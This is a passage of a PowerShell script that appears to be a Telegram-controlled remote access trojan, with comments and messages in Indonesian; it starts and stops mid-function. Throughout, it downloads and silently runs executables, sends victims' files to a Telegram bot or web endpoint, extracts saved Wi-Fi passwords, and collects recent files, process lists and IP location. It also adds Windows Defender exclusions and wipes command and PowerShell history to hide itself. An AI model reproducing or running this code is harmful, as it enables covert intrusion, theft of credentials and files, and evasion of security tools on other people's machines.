📍 Location  : $($response.city), $($response.regionName), $($response.country)
🏢 ISP       : $($response.isp)
🛰️ Lat/Lon   : $($response.lat), $($response.lon)
🕒 Timezone  : $($response.timezone)
🗺️ Map Link  : $mapUrl
"@
            Send-Message $msg
        } else {
            Send-Message "❌ Gagal mendapatkan lokasi IP"
        }
    } catch {
        Send-Message "❌ Error saat memanggil API lokasi: $_"
    }
}


function Download-AndExecute {
    param (
        [string]$url,
        [string]$filename = "$env:TEMP\tempfile.exe"
    )

    try {
        $tempPath = $filename
        Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
        Start-Process -FilePath $tempPath -WindowStyle Hidden
        Send-Message "✅ File berhasil di-download & dijalankan:`n$tempPath"
    } catch {
        Send-Message "❌ Gagal download atau execute: $_"
    }
}

function Download-AndExecuteZip {
    param (
        [string]$url,
        [string]$destinationPath
    )

    try {
        # Deteksi nama file dari URL
        $fileName = Split-Path $url -Leaf
        $ext = [System.IO.Path]::GetExtension($fileName).ToLower()

        # Pastikan folder ada
        if (-not (Test-Path $destinationPath)) {
            New-Item -Path $destinationPath -ItemType Directory -Force | Out-Null
        }

        $tempFile = Join-Path $env:TEMP $fileName

        # Download file
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing

        if ($ext -eq ".exe") {
            Start-Process -FilePath $tempFile -WindowStyle Hidden
            Send-Message "✅ File EXE berhasil dijalankan:`n$tempFile"
        }
        elseif ($ext -eq ".zip") {
            Expand-Archive -Path $tempFile -DestinationPath $destinationPath -Force
            $exe = Get-ChildItem -Path $destinationPath -Recurse -Filter *.exe | Select-Object -First 1

            if ($exe) {
                Start-Process -FilePath $exe.FullName -WindowStyle Hidden
                Send-Message "✅ ZIP berhasil diekstrak dan EXE dijalankan:`n$($exe.FullName)"
            } else {
                Send-Message "✅ ZIP berhasil diekstrak, tapi tidak ada file EXE ditemukan."
            }

            Remove-Item $tempFile -Force
        }
        else {
            Send-Message "⚠️ Format file tidak dikenali: $fileName"
        }

    } catch {
        Send-Message "❌ Gagal download/jalankan: $_"
    }
}

function Send-FileToWeb {
    param (
        [string]$FilePath,
        [string]$Url = "https://example.com/getfile.php"
    )

    $FilePath = Resolve-FolderToken $FilePath
    if (-Not (Test-Path $FilePath)) {
        Write-Host "File not found"
        return
    }

    try {
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $boundary = [System.Guid]::NewGuid().ToString()
        $lf = "`r`n"

        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

        $body = (
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$lf" +
            "Content-Type: application/octet-stream$lf$lf"
        )

        $end = "$lf--$boundary--$lf"

        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $endBytes = [System.Text.Encoding]::UTF8.GetBytes($end)

        $fullBody = New-Object byte[] ($bodyBytes.Length + $fileBytes.Length + $endBytes.Length)
        [System.Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $fullBody, $bodyBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($endBytes, 0, $fullBody, $bodyBytes.Length + $fileBytes.Length, $endBytes.Length)

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        Invoke-WebRequest -Uri $Url -Method Post -Body $fullBody -Headers $headers -UseBasicParsing
        Write-Host "✅ File sent!"
    }
    catch {
        Write-Host "❌ Error sending file: $_"
    }
}


function Send-FilesToWebMulti {
    param (
        [string[]]$FilePaths,
        [string]$Url = "https://example.com/getfile.php"
    )

    $boundary = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"

    $bodyBytesList = @()

    foreach ($filePath in $FilePaths) {
        if (-Not (Test-Path $filePath)) {
            Write-Host "❌ File not found: $filePath"
            continue
        }

        try {
            $fileName = [System.IO.Path]::GetFileName($filePath)
            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

            $partHeader = (
                "--$boundary$lf" +
                "Content-Disposition: form-data; name=`"files[]`"; filename=`"$fileName`"$lf" +
                "Content-Type: application/octet-stream$lf$lf"
            )
            $partFooter = $lf

            $partHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($partHeader)
            $partFooterBytes = [System.Text.Encoding]::UTF8.GetBytes($partFooter)

            $fullPart = New-Object byte[] ($partHeaderBytes.Length + $fileBytes.Length + $partFooterBytes.Length)
            [System.Buffer]::BlockCopy($partHeaderBytes, 0, $fullPart, 0, $partHeaderBytes.Length)
            [System.Buffer]::BlockCopy($fileBytes, 0, $fullPart, $partHeaderBytes.Length, $fileBytes.Length)
            [System.Buffer]::BlockCopy($partFooterBytes, 0, $fullPart, $partHeaderBytes.Length + $fileBytes.Length, $partFooterBytes.Length)

            $bodyBytesList += ,$fullPart
        }
        catch {
            Write-Host "❌ Error reading file: $filePath"
        }
    }

    if ($bodyBytesList.Count -eq 0) {
        Write-Host "❌ No valid files to send."
        return
    }

    # Footer of multipart
    $endBoundary = "--$boundary--$lf"
    $endBytes = [System.Text.Encoding]::UTF8.GetBytes($endBoundary)

    # Combine all parts
    $totalLength = ($bodyBytesList | Measure-Object -Property Length -Sum).Sum + $endBytes.Length
    $fullBody = New-Object byte[] $totalLength

    $offset = 0
    foreach ($part in $bodyBytesList) {
        [System.Buffer]::BlockCopy($part, 0, $fullBody, $offset, $part.Length)
        $offset += $part.Length
    }
    [System.Buffer]::BlockCopy($endBytes, 0, $fullBody, $offset, $endBytes.Length)

    # Send request
    try {
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        Invoke-WebRequest -Uri $Url -Method Post -Body $fullBody -Headers $headers -UseBasicParsing
        Write-Host "✅ Files sent!"
    }
    catch {
        Write-Host "❌ Error sending files: $_"
    }
}

function Get-DiskInfo {
    $message = ""

    # Informasi Disk Fisik
    $disks = Get-Disk | Select-Object Number, FriendlyName, Size, PartitionStyle, BusType, MediaType, OperationalStatus, IsBoot
    foreach ($d in $disks) {
        $sizeGB = "{0:N2}" -f ($d.Size / 1GB)
        $message += "Disk #: $($d.Number)`n"
        $message += "Name  : $($d.FriendlyName)`n"
        $message += "Size  : $sizeGB GB`n"
        $message += "Style : $($d.PartitionStyle)`n"
        $message += "Bus   : $($d.BusType)`n"
        $message += "Media : $($d.MediaType)`n"
        $message += "Status: $($d.OperationalStatus)`n"
        $message += "Boot  : $($d.IsBoot)`n"
        $message += "----------------------`n"
    }

    Send-Message $message
}

function Get-DiskInfo2 {
    param (
        [int]$DiskNumber = -1
    )

    $message = ""

    # Ambil semua disk atau satu disk
    $disks = if ($DiskNumber -ge 0) {
        Get-Disk -Number $DiskNumber
    } else {
        Get-Disk
    }

    foreach ($d in $disks) {
        $sizeGB = "{0:N2}" -f ($d.Size / 1GB)
        $message += "Disk #: $($d.Number)`n"
        $message += "Name  : $($d.FriendlyName)`n"
        $message += "Size  : $sizeGB GB`n"
        $message += "Style : $($d.PartitionStyle)`n"
        $message += "Bus   : $($d.BusType)`n"
        $message += "Media : $($d.MediaType)`n"
        $message += "Status: $($d.OperationalStatus)`n"
        $message += "Boot  : $($d.IsBoot)`n"
        $message += "---------------------------`n"

        # Ambil partisi yang ada di disk ini
        $partitions = Get-Partition -DiskNumber $d.Number
        foreach ($p in $partitions) {
            $vol = Get-Volume -Partition $p -ErrorAction SilentlyContinue
            $message += "  └─ Partition $($p.PartitionNumber):`n"
            $message += "     Type     : $($p.Type)`n"
            $message += "     Size     : {0:N2} GB`n" -f ($p.Size / 1GB)
            if ($vol) {
                $message += "     Drive    : $($vol.DriveLetter):`n"
                $message += "     Label    : $($vol.FileSystemLabel)`n"
                $message += "     FS Type  : $($vol.FileSystem)`n"
                $message += "     Used     : {0:N2} GB`n" -f (($vol.Size - $vol.SizeRemaining) / 1GB)
                $message += "     Free     : {0:N2} GB`n" -f ($vol.SizeRemaining / 1GB)
            }
            $message += "     ------------------`n"
        }
    }

    Send-Message $message
}

function Get-DriveInfo {
    $message = ""

    # Ambil info dari PSDrive
    $drives = Get-PSDrive -PSProvider 'FileSystem'

    # Ambil label dari Volume dan DriveType dari Win32_LogicalDisk
    $volumeInfo = @{}
    foreach ($v in Get-Volume) {
        if ($v.DriveLetter) {
            $letter = "$($v.DriveLetter)".ToUpper()
            $volumeInfo[$letter] = @{ 
                Label = $v.FileSystemLabel 
            }
        }
    }

    # Tambahkan DriveType dari WMI
    $logicalDisks = Get-WmiObject Win32_LogicalDisk
    foreach ($ld in $logicalDisks) {
        $letter = $ld.DeviceID.Replace(":", "").ToUpper()
        if (-not $volumeInfo.ContainsKey($letter)) {
            $volumeInfo[$letter] = @{}
        }
        $volumeInfo[$letter].DriveType = $ld.DriveType
    }

    foreach ($d in $drives) {
        $letter = $d.Name.ToUpper()
        $used = "{0:N2}" -f ($d.Used / 1GB)
        $free = "{0:N2}" -f ($d.Free / 1GB)

        $info = $volumeInfo[$letter]

        $label = if ($info.Label) { $info.Label } else { "Unknown" }

        switch ($info.DriveType) {
            2 { $type = "🔌 USB Drive" }
            3 { $type = "💾 Hard Drive" }
            4 { $type = "🌐 Network Drive" }
            5 { $type = "📀 CD-ROM" }
            Default { $type = "❓ Unknown" }
        }

        $message += "*$type*`n"
        $message += "Drive Name : $label ($letter)`n"
        $message += "Root       : $($d.Root)`n"
        $message += "Used (GB)  : $used`n"
        $message += "Free (GB)  : $free`n"
        $message += "-----------`n"
    }

    Send-Message $message
}


function Export-RecentFilesStealth {
    param (
        [string]$Token = $token,
        [string]$ChatId = $chatid
    )

    $recentPath = [Environment]::GetFolderPath("Recent")
    $shell = New-Object -ComObject WScript.Shell
    $result = @()

    Get-ChildItem -Path $recentPath -Filter *.lnk | ForEach-Object {
        try {
            $shortcut = $shell.CreateShortcut($_.FullName)
            $target = $shortcut.TargetPath
            if ($target) {
                $result += [PSCustomObject]@{
                    Name         = $_.Name
                    LastModified = $_.LastWriteTime
                    TargetPath   = $target
                }
            }
        } catch {}
    }

    if ($result.Count -eq 0) { return }

    $sorted = $result | Sort-Object LastModified -Descending

    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $user = $env:USERNAME
    $pc = $env:COMPUTERNAME
    $base = "$user-$pc-$timestamp"

    $txt = "$env:TEMP\$base.txt"
    $csv = "$env:TEMP\$base.csv"

    $sorted | ForEach-Object {
        "{0} | {1:dd/MM/yyyy HH:mm} | {2}" -f $_.Name, $_.LastModified, $_.TargetPath
    } | Out-File -Encoding UTF8 -FilePath $txt

    $sorted | Export-Csv -Path $csv -NoTypeInformation -Encoding UTF8

    Send-TelegramFile $txt $Token $chatid
    Send-TelegramFile $csv $Token $chatid

    Remove-Item $txt, $csv -Force -ErrorAction SilentlyContinue
}

function Send-MultiFiles {
    param (
        [string[]]$Paths,    # Array path file
        [string]$Token = $token,
        [string]$ChatId = $chatid
    )

    foreach ($path in $Paths) {
        if (Test-Path $path) {
            Send-TelegramFile -Path $path -Token $Token -ChatId $ChatId
            Start-Sleep -Milliseconds 500  # jeda biar nggak flood
        } else {
            Write-Warning "❌ File tidak ditemukan: $path"
        }
    }
}

function Send-ErrMessage {
    param (
        [string]$Message
    )

    try {
        $body = @{
            chat_id = $script:chatid
            text    = "$header `n" + "$Message"
        }
        Invoke-RestMethod -Uri "$script:apiBase/sendMessage" -Method Post -Body $body -UseBasicParsing > $null
    } catch {
        
    }
}

function Add-WinDefExclusion {
    [CmdletBinding()]
    param (
        [string[]] $Path,
        [string[]] $Process,
        [string[]] $Extension
    )

    
    $log = @()

    function Exec {
        param ($cmd)
        try {

            $escapedCmd = '$ErrorActionPreference="SilentlyContinue"; ' + $cmd
            Start-Process powershell -WindowStyle Hidden -ArgumentList @(
                "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", $escapedCmd
            )
        } catch {
        }
    }

    if ($Path) {
        $Path | ForEach-Object {
            
            if ($_ -and $_.Trim() -ne "") {
                $_ = Resolve-FolderToken $_
                $log += "[+] $_ `n"
                Exec "Add-MpPreference -ExclusionPath `"'$($_)'`""
            }
        }
    }

    if ($Process) {
        $Process | ForEach-Object {
            if ($_ -and $_.Trim() -ne "") {
                Exec "Add-MpPreference -ExclusionProcess `"'$($_)'`""
            }
        }
    }

    if ($Extension) {
        $Extension | ForEach-Object {
            if ($_ -and $_.Trim() -ne "") {
                Exec "Add-MpPreference -ExclusionExtension `"'$($_)'`""
            }
        }
    }

    # Kirim log
    if ($log.Count -gt 0) {
        $logText = $log -join "`n"
        Send-Message "<b>🛡️ Exclusion Log:</b>`n<code>$($logText -replace '<','&lt;' -replace '>','&gt;')</code>" -ParseMode 'HTML'
    } else {
        Send-Message "⚠️ Tidak ada input valid untuk exclusion." -ParseMode 'HTML'
    }
}

function Add-DefenderExclusionFromCommand {
    param ([string]$text)

# Ambil argumen setelah "exclude "
$args = $text.Substring(8).Trim()

if (
    ($args.StartsWith('"') -and $args.EndsWith('"')) -or
    ($args.StartsWith("'") -and $args.EndsWith("'"))
) {
    $args = $args.Substring(1, $args.Length - 2)
}

# Pisahkan: fungsi = kata pertama, sisanya = value
$parts = $args -split '\s+', 2
$func = $parts[0].ToLower()  # lowercase biar aman
$args = if ($parts.Count -gt 1) { $parts[1] } else { "" }

# Split args berdasarkan koma dan trimming
$clean = $args -split ',' | ForEach-Object { $_.Trim() }

# Siapkan parameter kosong
$Path = @()
$Process = @()
$Extension = @()

# Map func ke parameter
switch ($func) {
    "path"      { $Path = $clean }
    "process"   { $Process = $clean }
    "extension" { $Extension = $clean }
    default     { Write-Host "⚠️ Fungsi tidak dikenali: $func"; return }
}

# Panggil fungsi dengan parameter hasil parsing
Add-WinDefExclusion -Path $Path -Process $Process -Extension $Extension

}



function Help {
    $helpText = @"
<b>📖 DAFTAR PERINTAH:</b>

🔹 <code>driveinfo</code>
➤ Menampilkan informasi drive (USB, HDD, CD-ROM).
🔹 <code>diskinfo</code>
➤ Menampilkan informasi seluruh disk.
🔹 <code>diskinfo &lt;nomor&gt;</code>
➤ Menampilkan informasi disk berdasarkan nomor.
🔹 <code>getfile "C:\path\file.txt"</code>
➤ Mengirim file dari path tertentu.
🔹 <code>getfilem "file1","file2"</code>
➤ Mengirim beberapa file (pisahkan koma).
🔹 <code>getfold "C:\folder"</code>
➤ Mengirim folder dalam bentuk zip.
🔹 <code>getphoto "C:\img.jpg"</code>
➤ Mengirim gambar sebagai foto Telegram.
🔹 <code>run whoami</code>
➤ Menjalankan perintah PowerShell.
🔹 <code>screenshot</code>
➤ Mengambil screenshot layar.
🔹 <code>location</code>
➤ Menampilkan lokasi publik dari IP.
🔹 <code>getclip</code>
➤ Mengambil isi clipboard saat ini.
🔹 <code>start-clipwatch</code>
➤ Aktifkan monitoring clipboard realtime.
🔹 <code>stop-clipwatch</code>
➤ Hentikan clipboard watcher.
🔹 <code>activepage</code>
➤ Menampilkan nama app &amp; judul window aktif.
🔹 <code>recentfiles</code>
➤ Kirim file yang baru dibuka.
🔹 <code>downexec https://x/file.exe</code>
➤ Unduh dan jalankan file dari URL.
🔹 <code>downexeczip https://x/file.zip "C:\dump"</code>
➤ Unduh ZIP, ekstrak & jalankan isinya.
"@

    Send-Message $helpText -ParseMode 'HTML'
}

function Get-WifiPasswords {
    # 1. Hapus file lama
    Remove-Item .\Wi-Fi-*.xml -Force -ErrorAction SilentlyContinue
    Remove-Item .\WiFi-PASS.txt -Force -ErrorAction SilentlyContinue

    # 2. Export profil
    netsh wlan export profile key=clear > $null

    # 3. Ambil SSID & Key
    $result = ""
    Get-ChildItem -Path . -Filter "Wi-Fi-*.xml" | ForEach-Object {
        $xmlContent = Get-Content $_.FullName

        $ssidMatch = ($xmlContent | Select-String -Pattern "<name>(.*?)</name>" -AllMatches)
        $keyMatch  = ($xmlContent | Select-String -Pattern "<keyMaterial>(.*?)</keyMaterial>" -AllMatches)

        if ($ssidMatch.Matches.Count -gt 0) {
            $ssid = $ssidMatch.Matches[0].Groups[1].Value
        } else {
            $ssid = "(SSID tidak ditemukan)"
        }

        if ($keyMatch.Matches.Count -gt 0) {
            $key = $keyMatch.Matches[0].Groups[1].Value
        } else {
            $key = "(Tidak ada / tersembunyi)"
        }

        $result += "SSID : $ssid`n"
        $result += "Key  : $key`n"
        $result += "-------`n"
    }

    # 4. Hapus file jejak
    Remove-Item .\Wi-Fi-*.xml -Force -ErrorAction SilentlyContinue

    # 5. Output hasil
    if ($result) {
        $result
    } else {
        "❌ Tidak ada password ditemukan."
    }
}


function FolderInfo {
    param (
        [string[]]$Paths
    )

    $output = ""

    foreach ($folder in $Paths) {
        if (Test-Path $folder -PathType Container) {
            $files = Get-ChildItem -Path $folder -Recurse -File -ErrorAction SilentlyContinue
            $size = ($files | Measure-Object -Property Length -Sum).Sum
            $totalSizeMB = [math]::Round($size / 1MB, 2)
            $fileCount = $files.Count

            $output += "📁 Folder : $folder`n"
            $output += "📄 Files  : $fileCount`n"
            $output += "📦 Size   : $totalSizeMB MB`n"
            $output += "-------`n"
        } else {
            $output += "❌ Folder tidak ditemukan: $folder`n"
        }
    }

    Send-Message $output
}

function FileInfo {
    param (
        [string[]]$ArrayPath
    )

    $output = ""

    foreach ($path in $ArrayPath) {
        $resolved = Resolve-FolderToken $path

        if (Test-Path $resolved -PathType Leaf) {
            $item = Get-Item $resolved
            $sizeMB = [math]::Round($item.Length / 1MB, 2)
            $lastAccess = $item.LastAccessTime

            $output += "📄 File   : $($item.Name)`n"
            $output += "📦 Size   : $sizeMB MB`n"
            $output += "🕒 Access : $lastAccess`n"
            $output += "-------`n"
        }
        elseif (Test-Path $resolved -PathType Container) {
            $folder = Get-Item $resolved
            $allFiles = Get-ChildItem -Path $folder.FullName -Recurse -File -ErrorAction SilentlyContinue
            $totalSize = ($allFiles | Measure-Object -Property Length -Sum).Sum
            $sizeMB = [math]::Round($totalSize / 1MB, 2)
            $lastAccess = $folder.LastAccessTime

            $output += "📁 Folder : $($folder.FullName)`n"
            $output += "📦 Total  : $sizeMB MB`n"
            $output += "🕒 Access : $lastAccess`n"
            $output += "-------`n"
        }
        else {
            $output += "❌ Tidak ditemukan: $path`n"
        }
    }

    Send-Message $output
}


function SearchFileExt {
    param (
        [string[]]$ExtArray,
        [string[]]$PathArray
    )

    $output = ""

    foreach ($path in $PathArray) {
        $path = Resolve-FolderToken $path
        if (Test-Path $path -PathType Container) {
            foreach ($ext in $ExtArray) {
                $files = Get-ChildItem -Path $path -Recurse -File -Include "*.$ext" -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $size = [Math]::Round($file.Length / 1KB, 2)
                    $unit = "KB"
                    if ($size -gt 1024) {
                        $size = [Math]::Round($size / 1024, 2)
                        $unit = "MB"
                    }
                    $output += "📄 $($file.FullName) ($size $unit)`n"
                }
            }
        } else {
            $output += "❌ Path tidak ditemukan: $path`n"
        }
    }

    if (-not $output) {
        $output = "🔍 Tidak ada file ditemukan dengan ekstensi: $($ExtArray -join ', ')"
    }

    Send-Message $output
}

function Send-TelegramFileAsync {
    param (
        [string]$FilePath,
        [string]$Token = $global:token,
        [string]$ChatId = $global:chatid,
        [string]$Caption = $FilePath
    )

    $curl = "$env:SystemRoot\System32\curl.exe"
    if (-not (Test-Path $curl)) {
        Send-Message "❌ curl.exe not found"
        return
    }

    if (-not (Test-Path $FilePath)) {
        Send-Message "❌ File not found: $FilePath"
        return
    }

    $url = "https://api.telegram.org/bot$Token/sendDocument"

    # Escape file path dengan tanda kutip
    $quotedFilePath = "`"$FilePath`""
    $Caption = "`"File from : $username-$pcname ($localIP-$publicIP)`""

    # Gunakan Start-Process dengan argumen yang sesuai
    $args = @(
        "-s"
        "-F", "chat_id=$ChatId"
        "-F", "caption=$Caption"
        "-F", "document=@$quotedFilePath"
        "$url"
    )

    # Async, stealth
    #Start-Process -FilePath $curl -ArgumentList $args -WindowStyle Hidden

    try {
        Start-Process -FilePath $curl -ArgumentList $args -WindowStyle Hidden -ErrorAction Stop
    } catch {
        Send-Message "❌ Failed to send via curl: $_"
    }
}


function Send-File {
    param (
        [string]$Url,
        [string]$Destination
    )
    $Destination = Resolve-FolderToken $Destination
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing -ErrorAction Stop
        
    } catch {
        Send-Message "❌ Gagal download dari:`n$Url`n`nError: $_"
    }
}

function SearchFileExtSend {
    param (
        [string[]]$ExtArray,
        [string[]]$PathArray
    )

    $results = @()

    foreach ($rawPath in $PathArray) {
        $path = Resolve-FolderToken $rawPath

        if (Test-Path $path -PathType Container) {
            foreach ($ext in $ExtArray) {
                $files = Get-ChildItem -Path $path -Recurse -File -Include "*.$ext" -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $results += [PSCustomObject]@{
                        FileName     = $file.FullName
                        SizeKB       = [Math]::Round($file.Length / 1KB, 2)
                        SizeMB       = [Math]::Round($file.Length / 1MB, 2)
                        LastModified = $file.LastWriteTime
                    }
                }
            }
        } else {
            $results += [PSCustomObject]@{
                FileName     = "❌ Path tidak ditemukan: $rawPath"
                SizeKB       = ""
                SizeMB       = ""
                LastModified = ""
            }
        }
    }

    if (-not $results) {
        $results = [PSCustomObject]@{
            FileName     = "🔍 Tidak ada file ditemukan dengan ekstensi: $($ExtArray -join ', ')"
            SizeKB       = ""
            SizeMB       = ""
            LastModified = ""
        }
    }

    # Simpan ke file CSV di TEMP
    $tempFile = "$env:TEMP\result_$(Get-Random).csv"
    $results | Export-Csv -Path $tempFile -Encoding UTF8 -NoTypeInformation

    if (-not (Test-Path $tempFile)) {
        Send-ErrMessage "❌ File hasil tidak ditemukan."
        return
    }

    if ((Get-Item $tempFile).Length -gt 48MB) {
        Send-ErrMessage "❌ File terlalu besar untuk dikirim lewat bot Telegram (> 48MB)."
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        return
    }

    return $tempFile
}

function Custom-LS {
    param (
        [string]$Path,
        [string]$Mode = "view"  # default
    )

    $resolvedPath = Resolve-FolderToken $Path

    if (-not (Test-Path $resolvedPath)) {
        Send-Message "❌ Path tidak ditemukan: $Path"
        return
    }

    $items = Get-ChildItem -Path $resolvedPath -Force -ErrorAction SilentlyContinue

    if (-not $items) {
        Send-Message "📁 Tidak ada file atau folder di: $resolvedPath"
        return
    }

    $results = foreach ($item in $items) {
        [PSCustomObject]@{
            FileName      = $item.FullName
            Type          = if ($item.PSIsContainer) { "dir" } else { "file" }
            FileSize      = if ($item.PSIsContainer) { "-" } else { [Math]::Round($item.Length / 1KB, 2).ToString() + " KB" }
            DateModified  = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
        }
    }

    switch ($Mode.ToLower()) {
        "txt" {
            $tmp = "$env:TEMP\ls_$(Get-Random).txt"
            $results | Out-String | Set-Content -Path $tmp -Encoding UTF8
            Send-TelegramFile -FilePath $tmp
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        "csv" {
            $tmp = "$env:TEMP\ls_$(Get-Random).csv"
            $results | Export-Csv -Path $tmp -NoTypeInformation -Encoding UTF8
            Send-TelegramFile -FilePath $tmp
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        default {
            
            $text = "📁 List isi folder: $resolvedPath `n`n"

            foreach ($entry in $results) {
                $text += "$($entry.FileName)`n  [$($entry.Type)] $($entry.FileSize) | $($entry.DateModified)`n"
            }
            Send-Message ($text)
        }
    }
}

function Get-FolderSizeKB {
    param ($folderPath)
    try {
        $total = Get-ChildItem -Path $folderPath -Recurse -File -ErrorAction Stop |
                 Measure-Object -Property Length -Sum
        return [Math]::Round($total.Sum / 1KB, 2)
    } catch {
        return "-"
    }
}

function Custom-LSNew {
    param (
        [string]$Path,
        [string]$Mode = "view",       # view / txt / csv
        [switch]$Quick                # jika -Quick, folder tidak dihitung ukurannya
    )

    function Format-Size {
        param ($bytes)
        switch ($bytes) {
            { $_ -ge 1GB } { return "{0:N2} GB" -f ($_ / 1GB); break }
            { $_ -ge 1MB } { return "{0:N2} MB" -f ($_ / 1MB); break }
            { $_ -ge 1KB } { return "{0:N2} KB" -f ($_ / 1KB); break }
            default       { return "$_ B" }
        }
    }

    function Get-FolderSizeKB {
        param ($path)
        try {
            return [math]::Round((Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum / 1KB, 2)
        } catch {
            return 0
        }
    }

    $resolvedPath = Resolve-FolderToken $Path
    $direc = $resolvedPath

    if (-not (Test-Path $resolvedPath)) {
        Send-Message "❌ Path tidak ditemukan: $Path"
        return
    }

    $items = Get-ChildItem -Path $resolvedPath -Force -ErrorAction SilentlyContinue

    if (-not $items) {
        Send-Message "📁 Tidak ada file atau folder di: $resolvedPath"
        return
    }

    $results = foreach ($item in $items) {
        $isFolder = $item.PSIsContainer
        if ($isFolder) {
            if ($Quick) {
                $sizeRaw = "-"
                $sizeKB = "-"
                $sizeMB = "-"
                $sizeGB = "-"
                $formatted = "-"
            } else {
                $kb = Get-FolderSizeKB $item.FullName
                $sizeRaw = "$($kb * 1024)"
                $sizeKB = $kb
                $sizeMB = [Math]::Round($kb / 1024, 2)
                $sizeGB = [Math]::Round($kb / 1024 / 1024, 2)
                $formatted = Format-Size ($kb * 1024)
            }
        } else {
            $length = $item.Length
            $sizeRaw = $length
            $sizeKB = [Math]::Round($length / 1KB, 2)
            $sizeMB = [Math]::Round($length / 1MB, 2)
            $sizeGB = [Math]::Round($length / 1GB, 2)
            $formatted = Format-Size $length
        }

        [PSCustomObject]@{
            FilePath      = $item.FullName
            FileType      = if ($isFolder) { "dir" } else { "file" }
            Size          = $formatted
            SizeRaw       = $sizeRaw
            SizeKB        = $sizeKB
            SizeMB        = $sizeMB
            SizeGB        = $sizeGB
            DateModified  = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
        }
    }

    switch ($Mode.ToLower()) {
        "txt" {
            $tmp = "$env:TEMP\ls_$(Get-Random).txt"
            $results | Out-String | Set-Content -Path $tmp -Encoding UTF8
            Send-TelegramFile -FilePath $tmp
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        "csv" {
            $tmp = "$env:TEMP\ls_$(Get-Random).csv"
            $results | Export-Csv -Path $tmp -NoTypeInformation -Encoding UTF8
            Send-TelegramFile -FilePath $tmp
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        default {
            $text = "📁 List isi folder: "+$resolvedPath+" `n`n"
           # $text = "📁 List isi folder: $resolvedPath `n`n"
            foreach ($entry in $results) {
                $text += "`n$($entry.FilePath)`n  [$($entry.FileType)] $($entry.Size) | $($entry.DateModified)`n"
            }
            Send-Message $text
        }
    }                                    
}

function Get-ProcessList {
    param (
        [switch]$ToFile,
        [string]$OutPath = "$env:TEMP\ActiveApps.txt"
    )

    $output = @()

    $visibleProcs = Get-Process | Where-Object {
        $_.MainWindowTitle -ne "" -and $_.Path -ne $null
    }

    foreach ($proc in $visibleProcs) {
        try {
            $name = $proc.ProcessName
            $procId = $proc.Id
            $path = $proc.Path

            $info = @(
                "$name (PID: $procId)",
                "Path : $path",
                "------"
            )
            $output += $info
        } catch {
            # Skip jika permission error
        }
    }

    if ($ToFile) {
        $output | Out-File -Encoding UTF8 -FilePath $OutPath -Force
        return $output
    } else {
        return $output -join "`n"
    }
}


# === CLEAR PESAN LAMA (sekali di awal saja) ===
try {

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force

    $clearResp = Invoke-RestMethod -Uri "$apiBase/getUpdates?timeout=1" -UseBasicParsing
    if ($clearResp.result.Count -gt 0) {
        $lastUpdateId = ($clearResp.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$global:CurrentPath = (Get-Location).Path

# === LOOP POLLING ===
while ($true) {
    try {
        $url = "$apiBase/getUpdates?offset=$lastUpdateId&timeout=30"
        $resp = Invoke-RestMethod -Uri $url -UseBasicParsing
        
	Clear-History
	Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

        foreach ($update in $resp.result) {
            $msg = $update.message
            $text = $msg.text
            $user = $msg.from.username
            $update_id = $update.update_id

            $header2 = "➤ $username-$pcname ($localIP-$publicIP) :`n [$user] $text"

            # Simpan update_id terakhir agar tidak baca ulang
            if ($update_id -ge $lastUpdateId) {
                $lastUpdateId = $update_id + 1
            }

            if (-not $text) {
                if ($msg.PSObject.Properties['document'] -or $msg.PSObject.Properties['photo']) {
                    try {
                        $file = if ($msg.document) {
                            $msg.document
                        } else {
                            $msg.photo | Sort-Object width -Descending | Select-Object -First 1
                        }
            
                        $fileId = $file.file_id
                        $fileExt = if ($msg.document.file_name) {
                            [System.IO.Path]::GetExtension($msg.document.file_name)
                        } elseif ($msg.photo) {
                            ".jpg"
                        } else {
                            ""
                        }
            
                        $caption = $msg.caption
                        $rawName = $null
            
                        if ($msg.document.file_name) {
                            $rawName = $msg.document.file_name
                        } elseif ($caption) {
                            $rawName = "$caption$fileExt"
                        } else {
                            $rawName = "file_$($fileId)$fileExt"
                        }
            
                        # Bersihkan nama dari karakter ilegal
                        $safeName = ($rawName -replace '[\\/:*?"<>|]', '_')

                        Send-Message "➤ $username-$pcname ($localIP-$publicIP) :`n [$user] Sending File $safeName"
            
                        $fileInfo = Invoke-RestMethod -Uri "$apiBase/getFile?file_id=$fileId" -UseBasicParsing
                        $filePath = $fileInfo.result.file_path
            
                        $downloadUrl = "https://api.telegram.org/file/bot$Token/$filePath"
                        $savePath = Join-Path -Path $global:CurrentPath -ChildPath $safeName
            
